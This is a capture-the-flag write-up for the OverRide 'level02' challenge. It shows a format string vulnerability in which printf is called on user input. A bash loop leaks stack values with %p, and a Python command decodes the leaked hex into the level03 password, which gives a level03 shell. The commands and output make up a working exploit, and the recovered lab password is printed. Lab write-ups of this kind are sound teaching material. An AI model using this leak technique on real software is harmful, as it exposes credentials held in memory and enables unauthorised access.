# Level02

## Analysis

So there are several interesting things here, first thing is that the level 3 password is read and stored inside of `buf_1`.

There is also a `bin/sh` later but to get there we need to input the level 3 password which isn't really feasible...

However, at the end of the program, if we didn't input the right password, `printf(%var_78)` is called, which can lead to a format string exploit!

## Requirements

Well, we can use `%p or %x` to pop the values of the stack and read them, however inputting them manually is tedious so we'll use this little bash script:

```bash
for(( i = 1; i < 30; i++)); do echo "$i | %$i\$p" | ./level02 | grep does; done
```

This will execute the program 30 times, each loop will print the current iteration and use "%{i}p" which will fetch the "i"th value from the stack.

```bash
level02@OverRide:~$ for(( i = 1; i < 30; i++)); do echo "$i | %$i\$p" | ./level02 | grep does; done   
1 | 0x7fffffffea10 does not have access!
2 | (nil) does not have access!
3 | (nil) does not have access!
4 | 0x2a2a2a2a2a2a2a2a does not have access!
5 | 0x2a2a2a2a2a2a2a2a does not have access!
6 | 0x7fffffffec08 does not have access!
7 | 0x1f7ff9a08 does not have access!
8 | (nil) does not have access!
9 | (nil) does not have access!
10 | (nil) does not have access!
11 | (nil) does not have access!
12 | (nil) does not have access!
13 | (nil) does not have access!
14 | (nil) does not have access!
15 | (nil) does not have access!
16 | (nil) does not have access!
17 | (nil) does not have access!
18 | (nil) does not have access!
19 | (nil) does not have access!
20 | 0x100000000 does not have access!
21 | (nil) does not have access!
22 | 0x756e505234376848 does not have access!
23 | 0x45414a3561733951 does not have access!
24 | 0x377a7143574e6758 does not have access!
25 | 0x354a35686e475873 does not have access!
26 | 0x48336750664b394d does not have access!
27 | (nil) does not have access!
28 | 0x383225207c203832 does not have access!
29 | 0x7024 does not have access!
```

What's interesting here is that it gives us a block of long hex values from the stack, from 22 to 26. Surprisingly, this is our password!

## Exploit

<details>
    <summary>Spoiler</summary>

We can then decode this block using the following command:

```bash
level02@OverRide:~$ python -c 'print "48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848".decode("hex")[::-1]'                                                                   
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

We need the `[::-1]` since the address little endian.

With this we can pass the check:

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: uwu
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, uwu!
$ whoami
level03
$
```

</details>